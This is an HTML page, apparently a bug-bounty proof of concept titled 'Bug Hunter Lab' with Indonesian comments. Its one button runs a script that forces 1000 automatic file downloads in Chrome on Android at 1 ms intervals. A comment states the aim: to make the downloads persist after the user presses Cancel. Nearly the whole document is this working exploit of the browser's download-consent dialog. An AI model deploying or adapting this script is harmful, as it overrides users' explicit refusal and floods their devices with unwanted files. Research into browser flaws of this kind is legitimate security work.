<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Race Condition Research - Chrome Android</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background: #0f0f0f; color: #fff; }
        .card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 450px; margin: auto; }
        .btn-hunt {
            background: linear-gradient(45deg, #d93025, #ff5252);
            color: white; padding: 18px; border: none; border-radius: 10px;
            font-weight: bold; width: 100%; font-size: 1.1rem; cursor: pointer;
            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4);
        }
        #status { margin-top: 20px; font-family: monospace; color: #00ff00; font-size: 0.9rem; text-align: left; }
    </style>
</head>
<body>

    <div class="card">
        <h2>🛡️ Bug Hunter Lab</h2>
        <p style="color: #bbb; font-size: 0.9rem;">
            Tujuan: Membuktikan <b>Persistence</b> setelah user klik <b>BATAL</b>.
        </p>
        
        <button class="btn-hunt" onclick="startHunting()">
            LAUNCH ASYNC INJECTION
        </button>

        <div id="status">Status: Ready...</div>
    </div>

    <script>
        async function startHunting() {
            const statusDiv = document.getElementById('status');
            const total = 1000; // Jumlah yang cukup untuk membuktikan antrean sistem
            
            statusDiv.innerHTML = "[!] Initializing Task Queue...";

            for (let i = 1; i <= total; i++) {
                const link = document.createElement('a');
                
                // Data URI minimalis
                const data = `Evidence ID: ${i} | Timestamp: ${Date.now()}`;
                link.href = "data:text/plain;base64," + btoa(data);
                link.download = `race_evidence_${i}.txt`;
                
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                // Update UI log setiap 50 file
                if (i % 50 === 0) {
                    statusDiv.innerHTML += `<br>[+] Queued: ${i}/${total}`;
                }

                /* KUNCI RACE CONDITION:
                   Memberikan jeda 1ms agar Chrome sempat memproses UI (muncul dialog),
                   tapi antrean JS tetap berjalan di background secepat mungkin.
                */
                await new Promise(resolve => setTimeout(resolve, 1));
            }
            
            statusDiv.innerHTML += "<br>[DONE] All tasks sent. Check OS response.";
        }
    </script>

</body>
</html>
